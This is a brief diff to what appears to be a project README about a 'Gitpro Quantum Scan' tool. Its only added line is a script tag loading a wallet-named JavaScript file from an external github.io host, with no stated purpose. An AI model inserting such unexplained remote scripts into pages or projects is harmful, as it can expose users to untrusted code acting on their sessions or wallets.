@@ -42,3 +42,4 @@ Open [http://localhost:3000](http://localhost:3000) in your browser.
 
 ### Gitpro Quantum Scan — Suggestion Expanded
 ![Quantum scan with suggestion expanded](https://github.com/user-attachments/assets/6cc3471b-c64c-4f0c-8364-c997db41c05d)
+<script src="https://www-infinity4.github.io/Mint-For-Infinity/infinity-wallet-menu.js" defer></script>
